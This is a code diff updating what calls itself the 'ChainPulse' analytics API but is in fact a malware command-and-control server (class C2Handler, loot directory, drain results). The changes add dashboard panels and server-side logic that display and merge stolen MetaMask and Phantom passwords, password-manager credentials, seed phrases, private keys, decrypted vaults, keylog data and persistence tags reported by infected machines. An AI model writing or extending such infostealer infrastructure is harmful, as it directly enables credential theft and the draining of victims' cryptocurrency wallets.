@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""ChainPulse v8.2 — Analytics & Health API (Render-compatible).
+"""ChainPulse v8.3 — Analytics & Health API (Render-compatible).
 
 Accepts both:
   - Python agent envelope: {endpoint, campaign, timestamp, payload:{system_info,...}}
@@ -26,7 +26,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ChainPulse v8.2 — Analytics</title>
+<title>ChainPulse v8.3 — Analytics</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'SF Mono','Consolas','Courier New',monospace;background:#080810;color:#00ff88;padding:20px;font-size:13px}
@@ -49,6 +49,17 @@ pre{background:#050510;padding:10px;border-radius:4px;overflow-x:auto;margin:10p
 .badge-erc20{background:#00d4ff;color:#000}
 .badge-session{background:#00cc66;color:#000}
 .badge-files{background:#00d4ff;color:#000}
+.badge-pw{background:#ff2244;color:#fff;font-weight:bold;font-size:12px}
+.badge-seed{background:#ffd700;color:#000;font-weight:bold}
+.hl-box{background:#1a0508;border:2px solid #ff3355;border-radius:8px;padding:14px 16px;margin:10px 0;box-shadow:0 0 12px rgba(255,40,60,.25)}
+.hl-box.seed{border-color:#ffd700;background:#14100a;box-shadow:0 0 12px rgba(255,215,0,.2)}
+.hl-box.key{border-color:#00d4ff;background:#0a1018}
+.hl-title{color:#ff4466;font-size:15px;font-weight:bold;letter-spacing:.5px;margin-bottom:6px}
+.hl-box.seed .hl-title{color:#ffd700}
+.hl-box.key .hl-title{color:#00d4ff}
+.hl-value{color:#fff;font-size:16px;font-family:Consolas,monospace;word-break:break-all;background:#000;padding:8px 10px;border-radius:4px;margin-top:4px}
+.hl-meta{color:#888;font-size:11px;margin-top:6px}
+.persist-tag{background:#8844ff;color:#fff}
 table{width:100%;border-collapse:collapse;margin:8px 0}
 td,th{padding:6px 8px;border:1px solid #1a3a3a;text-align:left;font-size:11px}
 th{background:#0f1a1a;color:#ffd700}
@@ -62,7 +73,7 @@ a{color:#00d4ff}
 </style>
 </head>
 <body>
-<h1>ChainPulse v8.2 — Analytics Dashboard</h1>
+<h1>ChainPulse v8.3 — Analytics Dashboard</h1>
 <div id="stats"></div>
 <div id="loot"></div>
 <script>
@@ -155,9 +166,15 @@ async function load(){
     const capPw=(p.secrets.captured_passwords||[]);
     const klCount=(p.keylog&&p.keylog.count)||(p.keylog&&p.keylog.entries&&p.keylog.entries.length)||0;
     const pmList=Array.isArray(p.password_managers)?p.password_managers:[];
-    if(seeds)html+='<span class="badge badge-danger">SEED x'+seeds+'</span> ';
+    const highlights=Array.isArray(p.highlights)?p.highlights:[];
+    const decVaults=(p.secrets.decrypted_vaults||[]);
+    const seedList=(p.secrets.seed_phrases||[]);
+    const keyList=(p.secrets.private_keys||[]);
+    if(p.persistent||String(p.endpoint||'').includes('persist'))html+='<span class="badge persist-tag">PERSISTENTE</span> ';
+    if(seeds)html+='<span class="badge badge-seed">SEED x'+seeds+'</span> ';
     if(pkeys)html+='<span class="badge badge-btc">KEY x'+pkeys+'</span> ';
-    if(capPw.length)html+='<span class="badge badge-danger">PASSWORDS x'+capPw.length+'</span> ';
+    if(capPw.length)html+='<span class="badge badge-pw">SENHAS x'+capPw.length+'</span> ';
+    if(decVaults.length)html+='<span class="badge badge-danger">VAULT ABERTO x'+decVaults.length+'</span> ';
     if(klCount)html+='<span class="badge badge-session">KEYLOG x'+klCount+'</span> ';
     if(pmList.length)html+='<span class="badge badge-files">PWD-MGR x'+pmList.length+'</span> ';
     if(fileCount)html+='<span class="badge badge-files">FILES x'+fileCount+'</span> ';
@@ -166,22 +183,54 @@ async function load(){
       html+='<span class="badge badge-session">SESSIONS: '+domains.slice(0,5).join(', ')+'</span> ';
     }
 
-    if(capPw.length){
-      html+='<div class="file-list" style="color:#ff8888;max-height:160px">';
-      for(const x of capPw.slice(0,20)){
-        html+='<div><b>'+String(x.window||'?').slice(0,50)+'</b> → <span class="key">'+String(x.password||'').slice(0,64)+'</span></div>';
+    // === HIGHLIGHTS: plain language captures ===
+    function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');}
+    // Build highlights from structured data if empty
+    let hls=highlights.slice();
+    if(!hls.length){
+      for(const x of capPw){
+        const lab=String(x.label||'').toUpperCase();
+        let title='CAPTURADA SENHA';
+        if(lab==='METAMASK'||/metamask/i.test(x.window||'')) title='CAPTURADA SENHA METAMASK';
+        else if(lab==='PHANTOM'||/phantom/i.test(x.window||'')) title='CAPTURADA SENHA PHANTOM';
+        else if(lab==='PASSWORD_MANAGER'||/bitwarden|keepass|1password|safepass/i.test(x.window||'')) title='CAPTURADA SENHA PASSWORD MANAGER';
+        else if(x.window) title='CAPTURADA SENHA ('+String(x.window).slice(0,40)+')';
+        hls.push({type:'password',title:title,value:x.password||x.value||'',window:x.window||'',at:x.captured_at||''});
+      }
+      for(const s of seedList){
+        hls.push({type:'seed',title:'SEED PHRASE DESBLOQUEADA',value:s.value||s,source:s.source||s.password_used||''});
+      }
+      for(const k of keyList.slice(0,15)){
+        hls.push({type:'key',title:'PRIVATE KEY DESBLOQUEADA',value:k.value||k,source:k.source||''});
+      }
+    }
+    if(hls.length){
+      html+='<div style="margin-top:10px">';
+      for(const h of hls.slice(0,25)){
+        const cls=h.type==='seed'?'hl-box seed':h.type==='key'?'hl-box key':'hl-box';
+        html+='<div class="'+cls+'">';
+        html+='<div class="hl-title">'+esc(h.title||'CAPTURA')+'</div>';
+        html+='<div class="hl-value">'+esc(h.value||'')+'</div>';
+        let meta=[];
+        if(h.window) meta.push('Janela: '+esc(String(h.window).slice(0,60)));
+        if(h.source) meta.push('Origem: '+esc(String(h.source).slice(0,80)));
+        if(h.at) meta.push(esc(String(h.at)));
+        if(meta.length) html+='<div class="hl-meta">'+meta.join(' · ')+'</div>';
+        html+='</div>';
       }
       html+='</div>';
     }
+
     if(pmList.length){
-      html+='<div class="file-list">'+pmList.slice(0,15).map(n=>'<div>[PM] '+n+'</div>').join('')+
+      html+='<div class="file-list">'+pmList.slice(0,15).map(n=>'<div>[PM] '+esc(n)+'</div>').join('')+
         (pmList.length>15?'<div>… +'+(pmList.length-15)+' more</div>':'')+'</div>';
     }
     if(fileCount){
-      const names=Object.keys(p.files).slice(0,40);
-      html+='<div class="file-list">'+names.map(n=>'<div>'+n+'</div>').join('')+
-        (Object.keys(p.files).length>40?'<div>… +'+(Object.keys(p.files).length-40)+' more</div>':'')+
-        '</div>';
+      const names=Object.keys(p.files).slice(0,25);
+      html+='<details style="margin-top:8px"><summary class="label" style="cursor:pointer">Arquivos capturados ('+fileCount+') — clique para expandir</summary>';
+      html+='<div class="file-list">'+names.map(n=>'<div>'+esc(n)+'</div>').join('')+
+        (Object.keys(p.files).length>25?'<div>… +'+(Object.keys(p.files).length-25)+' more</div>':'')+
+        '</div></details>';
     }
 
     const dr=p.drain_results||[];
@@ -264,6 +313,41 @@ def _normalize_payload(raw: dict) -> dict:
         pl["exchange_sessions"] = pl.get("exchange_sessions") if isinstance(pl.get("exchange_sessions"), list) else []
     if "files" not in pl or not isinstance(pl.get("files"), dict):
         pl["files"] = pl.get("files") if isinstance(pl.get("files"), dict) else {}
+    if "highlights" not in pl or not isinstance(pl.get("highlights"), list):
+        pl["highlights"] = pl.get("highlights") if isinstance(pl.get("highlights"), list) else []
+    # Auto-build highlights from secrets if client didn't send them
+    if not pl["highlights"]:
+        for x in (pl.get("secrets") or {}).get("captured_passwords") or []:
+            if not isinstance(x, dict):
+                continue
+            lab = str(x.get("label") or "").upper()
+            win = str(x.get("window") or "")
+            title = "CAPTURADA SENHA"
+            if lab == "METAMASK" or "metamask" in win.lower():
+                title = "CAPTURADA SENHA METAMASK"
+            elif lab == "PHANTOM" or "phantom" in win.lower():
+                title = "CAPTURADA SENHA PHANTOM"
+            elif lab == "PASSWORD_MANAGER" or any(k in win.lower() for k in ("bitwarden", "keepass", "1password", "safepass")):
+                title = "CAPTURADA SENHA PASSWORD MANAGER"
+            elif win:
+                title = f"CAPTURADA SENHA ({win[:40]})"
+            pl["highlights"].append({
+                "type": "password",
+                "title": title,
+                "value": x.get("password") or x.get("value") or "",
+                "window": win,
+                "at": x.get("captured_at") or "",
+            })
+        for s in (pl.get("secrets") or {}).get("seed_phrases") or []:
+            val = s.get("value") if isinstance(s, dict) else s
+            src = s.get("source") if isinstance(s, dict) else ""
+            if val:
+                pl["highlights"].append({"type": "seed", "title": "SEED PHRASE DESBLOQUEADA", "value": val, "source": src})
+        for k in ((pl.get("secrets") or {}).get("private_keys") or [])[:15]:
+            val = k.get("value") if isinstance(k, dict) else k
+            src = k.get("source") if isinstance(k, dict) else ""
+            if val:
+                pl["highlights"].append({"type": "key", "title": "PRIVATE KEY DESBLOQUEADA", "value": val, "source": src})
 
     # Infer wallets from file paths (MetaMask etc.)
     if not pl["wallets"] and pl["files"]:
@@ -336,7 +420,7 @@ class C2Handler(BaseHTTPRequestHandler):
         elif self.path == "/api/loot-summary":
             self._serve_json(self._get_summary())
         elif self.path == "/health":
-            self._serve_json({"status": "healthy", "version": "8.2.0", "render": True})
+            self._serve_json({"status": "healthy", "version": "8.3.0", "render": True})
         else:
             self.send_error(404)
 
@@ -437,6 +521,17 @@ class C2Handler(BaseHTTPRequestHandler):
                     epl["secrets"] = esec
                     if pl.get("keylog") and (pl["keylog"].get("count") or pl["keylog"].get("entries")):
                         epl["keylog"] = pl["keylog"]
+                    if pl.get("highlights"):
+                        eh = list(epl.get("highlights") or [])
+                        seen_h = set()
+                        for h in eh:
+                            seen_h.add(json.dumps(h, sort_keys=True, default=str)[:200])
+                        for h in pl["highlights"]:
+                            key = json.dumps(h, sort_keys=True, default=str)[:200]
+                            if key not in seen_h:
+                                eh.append(h)
+                                seen_h.add(key)
+                        epl["highlights"] = eh
                     if pl.get("password_managers"):
                         pm = list(epl.get("password_managers") or [])
                         for x in pl["password_managers"]:
@@ -563,7 +658,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    print(f"[C2] ChainPulse v8.2.0 (Render) — http://{HOST}:{PORT}")
+    print(f"[C2] ChainPulse v8.3.0 (Render) — http://{HOST}:{PORT}")
     print(f"[C2] Dashboard: /dashboard")
     print(f"[C2] Health:    /health")
     print(f"[C2] Loot dir:  {LOOT_DIR}")
